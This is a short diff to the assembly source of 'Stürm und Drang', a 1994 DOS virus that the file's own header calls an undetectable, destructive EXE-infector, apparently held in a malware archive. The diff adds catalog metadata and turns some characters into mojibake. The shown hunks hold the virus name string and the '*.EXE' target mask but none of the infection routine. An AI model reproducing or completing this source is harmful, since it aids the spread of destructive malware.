@@ -1,11 +1,22 @@
+; ------------------------------------------------------------
+; name      S
+; type      asm
+; cve       ‚Äî
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     ‚Äî
+; ------------------------------------------------------------
 ; ------------------------------------------------------------------------------
 ;
-;                         - StÅrm und Drang -
+;                         - StÔøΩrm und Drang -
 ;       Created by Immortal Riot's destructive development team
 ;              (c) 1994 The Unforgiven/Immortal Riot 
 ;
 ; ------------------------------------------------------------------------------
-;               ˛ Undetectable/Destructive EXE-infector ˛
+;               ÔøΩ Undetectable/Destructive EXE-infector ÔøΩ
 ; ------------------------------------------------------------------------------
 .model  tiny
 .radix  16
@@ -236,7 +247,7 @@ quit:
 pop     ds                                              ; jmp org program
 retf
 
-v_name           db "[StÅrm und Drang!] (c) '94 The Unforgiven/Immortal Riot"
+v_name           db "[StÔøΩrm und Drang!] (c) '94 The Unforgiven/Immortal Riot"
 
 exe_files        db   "*.EXE",0     
 
